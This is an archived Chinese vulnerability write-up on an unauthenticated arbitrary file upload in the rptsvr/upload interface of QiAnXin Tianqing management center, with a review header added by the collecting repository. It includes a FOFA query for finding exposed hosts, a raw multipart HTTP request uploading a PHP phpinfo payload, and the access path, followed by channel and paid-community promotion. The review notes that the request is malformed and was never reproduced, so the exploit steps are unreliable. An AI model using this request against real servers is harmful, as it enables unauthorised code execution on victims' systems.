---
source: "MrWQ/vulnerability-paper"
id: "vw-f706e6c6c19a0e4089b399f5"
entity_id: "ve-f706e6c6c19a0e4089b399f5"
schema_version: "1"
title: "奇安信 天擎 rptsvr 任意文件上传"
product: "奇安信天擎管理中心"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "≤6.7.0.4130声称，无认证头，PHP控制器路径"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E5%A4%A9%E6%93%8E%20rptsvr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://mp.weixin.qq.com/s/Ijbunc9p8Mu-Gk-pChGKDA"
source_status: "recorded"
---

# 奇安信 天擎 rptsvr 任意文件上传

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：奇安信天擎管理中心
- 本文讨论：rptsvr/upload任意文件上传
- 版本、权限与配置前提：≤6.7.0.4130声称，无认证头，PHP控制器路径
- 资料类型：rptsvr上传复现；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- multipart所有Content-Disposition的name/filename均丢失且终止边界缺--，关键穿越文件名不可复现
- 声称固定TController.php路径但请求无该文件名，步骤中断
- Nuclei脚本需关注领取而非随文；大量营销，无官方补丁
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 完整原请求、版本和写入解析路径待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ijbunc9p8Mu-Gk-pChGKDA)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rHvYyG0HCudf6IApkqsG6ib531eRPH00LFvvFlsMrJ12QXqbKQicCd22lL1y5jQakibicNKJRSNYrf9RA/640?wx_fmt=png&from=appmsg)

**请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习交流使用，如若非法他用，与平台和本文作者无关，需自行负责！**

**00**

**漏洞概述**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rHvYyG0HCudf6IApkqsG6ib5PIjXTEAQsdRsjy7ic0CfiaE3qxMyM3XMENBGyGYTzOhIsFMicCNu3hicbw/640?wx_fmt=png&from=appmsg)

奇安信 天擎管理中心 <=V6.7.0.4130 版本的 rptsvr 接口存在任意文件上传漏洞，可上传恶意至服务器，执行脚本文件。

**01**

**空间搜索语法**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rHvYyG0HCudf6IApkqsG6ib5PIjXTEAQsdRsjy7ic0CfiaE3qxMyM3XMENBGyGYTzOhIsFMicCNu3hicbw/640?wx_fmt=png&from=appmsg)

FoFa

banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系 4008-136-360"

**02**

**利用过程**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rHvYyG0HCudf6IApkqsG6ib5PIjXTEAQsdRsjy7ic0CfiaE3qxMyM3XMENBGyGYTzOhIsFMicCNu3hicbw/640?wx_fmt=png&from=appmsg)

登录页面如下

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rEofrXODgG3Qsa2CKEqMLwDRvUQpBvL7Q4YicmQEsXIflk3vP48DkOnauQU2rtNQYic4x6oy13Vuf6g/640?wx_fmt=png&from=appmsg)

上传数据包如下：

```http
POST /rptsvr/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
Connection: close
Content-Length: 414
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
Upgrade-Insecure-Requests: 1
-----------------------------55433477442814818502792421460
Content-Disposition: form-data; 
Content-Type: text/x-python
<?php
phpinfo();
?>
-----------------------------55433477442814818502792421460
Content-Disposition: form-data; 
skylar_report
-----------------------------55433477442814818502792421460

```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rEofrXODgG3Qsa2CKEqMLwDlpysic0qejykxs7g5J7kgniaf0vdLeyYEEm1yXAXlSwroiaWhVbwQtWHg/640?wx_fmt=png&from=appmsg)

访问上传文件路径如下：  

```
http://xxxx/application/api/controllers/TController.php

```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rEofrXODgG3Qsa2CKEqMLwD6yLTZFJHjeT2baIMiau7ebAib8lCQxN8FXZBTAEIj9dChFfiaQOL4ICSw/640?wx_fmt=png&from=appmsg)

**03**

**nuclei poc**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rHvYyG0HCudf6IApkqsG6ib5PIjXTEAQsdRsjy7ic0CfiaE3qxMyM3XMENBGyGYTzOhIsFMicCNu3hicbw/640?wx_fmt=png&from=appmsg)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rEofrXODgG3Qsa2CKEqMLwDwrg29Sb2zNTI7rDjU4ExDEBxhsWHDqxR4kYRrpa9Pw4Z8wGIu3QBiaQ/640?wx_fmt=png&from=appmsg)

获取脚本关注本公众号后发送：qaxtq1

**04**

**星球简介**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rHvYyG0HCudf6IApkqsG6ib5PIjXTEAQsdRsjy7ic0CfiaE3qxMyM3XMENBGyGYTzOhIsFMicCNu3hicbw/640?wx_fmt=png&from=appmsg)

**考虑到团队运营成本和公众号****福利发放****，创建知识星球欢迎各位师傅打赏💰****后期会用打赏的资金去****做福利****。星球的性价比真的比较可观，绝对不会因为某些身外之物水文章，安全圈很小，主要是和师傅们****交个朋友****。还请各位师傅监督团队后边的表现，将心比心![图片](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/Expression/Expression_67@2x.png)！**

**进入星球你能直接收获到：**

1.  优先于公众号的 POC 更新（提前一两周~~）
    
2.  定制化的成品工具开发
    
3.  私人定制的客户需求（要求不要太过分呦~~）
    
4.  实战技巧、攻防思路
    
5.  杂七杂八的技术小福利
    
6.  根据能力不定期的星球内部抽奖
    
7.  更多漏洞利用 Tips  
    

欢迎各位师傅加入哦~～

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rGG0kwDuoVbFd1QRfqqNx8oaaHZE3zicqYZYeiaHxMSqj8jFEcbhZDsOxEfeZvcviaXLpMFNLibAcaLGg/640?wx_fmt=png&from=appmsg)

进入星球直接能学习到这些漏洞：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/zkGUVUGR8rGG0kwDuoVbFd1QRfqqNx8oJEl0gmuMxDZpRic42FYdBPJcMHfOnnDVYpdxcRqCvCfI2JViaEicJJM9Q/640?wx_fmt=png&from=appmsg)

✓

关注我们

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
